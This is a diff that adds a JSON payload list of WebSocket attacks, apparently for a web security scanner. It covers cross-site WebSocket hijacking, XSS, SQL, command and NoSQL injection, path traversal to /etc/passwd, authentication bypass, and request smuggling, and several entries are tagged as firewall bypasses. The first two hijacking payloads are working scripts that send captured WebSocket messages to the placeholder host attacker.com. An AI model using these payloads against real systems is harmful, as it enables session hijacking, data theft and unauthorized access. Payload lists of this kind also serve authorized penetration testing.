@@ -1,0 +1,55 @@
+{
+  "category": "websocket",
+  "contexts": {
+    "cswsh": {
+      "description": "Cross-Site WebSocket Hijacking (CSWSH) payloads",
+      "payloads": [
+        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onmessage=function(e){fetch('https://attacker.com/?d='+btoa(e.data))}</script>", "description": "Basic CSWSH — exfiltrate WebSocket messages to attacker", "waf_bypass": false},
+        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send('{\"action\":\"get_profile\"}')};ws.onmessage=function(e){new Image().src='https://attacker.com/?d='+encodeURIComponent(e.data)}</script>", "description": "CSWSH with action trigger — request sensitive data then exfiltrate", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com", "description": "Origin header test — check if server validates WebSocket Origin", "waf_bypass": false},
+        {"payload": "Origin: https://target.com.attacker.com", "description": "Subdomain confusion in Origin validation", "waf_bypass": true},
+        {"payload": "Origin: null", "description": "Null origin — sandboxed iframe or data: URI bypass", "waf_bypass": true},
+        {"payload": "Origin: https://target.com", "description": "Legitimate origin baseline — compare behavior with attacker origin", "waf_bypass": false},
+        {"payload": "<script>var ws=new WebSocket('wss://target.com/ws',['valid-subprotocol']);ws.onopen=function(){ws.send('auth_bypass_test')}</script>", "description": "CSWSH with subprotocol — test if auth relies on protocol header", "waf_bypass": false}
+      ]
+    },
+    "injection": {
+      "description": "WebSocket message injection payloads (XSS, SQLi, command injection via WS)",
+      "payloads": [
+        {"payload": "{\"message\": \"<img src=x onerror=alert(document.domain)>\"}", "description": "XSS via WebSocket message — rendered in chat/feed UI", "waf_bypass": false},
+        {"payload": "{\"message\": \"<script>alert(1)</script>\"}", "description": "Script tag XSS via WebSocket broadcast", "waf_bypass": false},
+        {"payload": "{\"query\": \"' OR '1'='1\"}", "description": "SQLi via WebSocket JSON query parameter", "waf_bypass": false},
+        {"payload": "{\"command\": \"test; id\"}", "description": "Command injection via WebSocket command field", "waf_bypass": false},
+        {"payload": "{\"path\": \"../../../etc/passwd\"}", "description": "Path traversal via WebSocket file request", "waf_bypass": false},
+        {"payload": "{\"action\": \"subscribe\", \"channel\": \"admin\"}", "description": "Channel subscription escalation — access admin channel", "waf_bypass": false},
+        {"payload": "{\"type\":\"message\",\"data\":\"{{7*7}}\"}", "description": "SSTI probe via WebSocket message field", "waf_bypass": false},
+        {"payload": "{\"id\": {\"$gt\": \"\"}}", "description": "NoSQL operator injection via WebSocket JSON", "waf_bypass": false}
+      ]
+    },
+    "auth_bypass": {
+      "description": "WebSocket authentication and authorization bypass payloads",
+      "payloads": [
+        {"payload": "{\"type\": \"auth\", \"token\": \"\"}", "description": "Empty auth token — test if WS accepts null authentication", "waf_bypass": false},
+        {"payload": "{\"type\": \"auth\", \"token\": \"null\"}", "description": "Literal null string as auth token", "waf_bypass": false},
+        {"payload": "{\"type\": \"auth\", \"user_id\": 1}", "description": "Direct user_id in auth — test for IDOR in WS session", "waf_bypass": false},
+        {"payload": "{\"action\": \"admin_action\", \"role\": \"admin\"}", "description": "Client-side role claim in WebSocket message", "waf_bypass": false},
+        {"payload": "Sec-WebSocket-Protocol: admin", "description": "Subprotocol header set to admin — test server-side check", "waf_bypass": false},
+        {"payload": "{\"type\": \"join_room\", \"room\": \"admin-dashboard\"}", "description": "Direct room/channel join without authorization", "waf_bypass": false},
+        {"payload": "{\"action\": \"get_users\", \"admin\": true}", "description": "Boolean admin flag in WebSocket request", "waf_bypass": false},
+        {"payload": "Cookie: session=expired_or_invalid_token", "description": "Expired cookie in WS upgrade — test if auth is only checked at handshake", "waf_bypass": false}
+      ]
+    },
+    "smuggling": {
+      "description": "WebSocket-based smuggling and protocol abuse payloads",
+      "payloads": [
+        {"payload": "GET / HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n", "description": "H2C smuggling via WebSocket upgrade — smuggle request after handshake", "waf_bypass": false},
+        {"payload": "Upgrade: websocket\r\nSec-WebSocket-Version: 0", "description": "Legacy WS version — test for downgrade attacks", "waf_bypass": false},
+        {"payload": "Upgrade: websocket\r\nConnection: keep-alive, Upgrade", "description": "Keep-alive with Upgrade — proxy confusion for smuggling", "waf_bypass": true},
+        {"payload": "Sec-WebSocket-Version: 13, 8, 7", "description": "Multiple WS versions — parser confusion", "waf_bypass": true},
+        {"payload": "GET / HTTP/1.1\r\nHost: target.com\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n", "description": "H2C upgrade smuggling — bypass reverse proxy via cleartext HTTP/2", "waf_bypass": true},
+        {"payload": "Upgrade: WebSocket\r\nSec-WebSocket-Key: \r\n", "description": "Empty Sec-WebSocket-Key — test server validation", "waf_bypass": false},
+        {"payload": "GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nOrigin: https://target.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n", "description": "WS upgrade with spoofed internal IP — bypass IP-based WS auth", "waf_bypass": true}
+      ]
+    }
+  }
+}
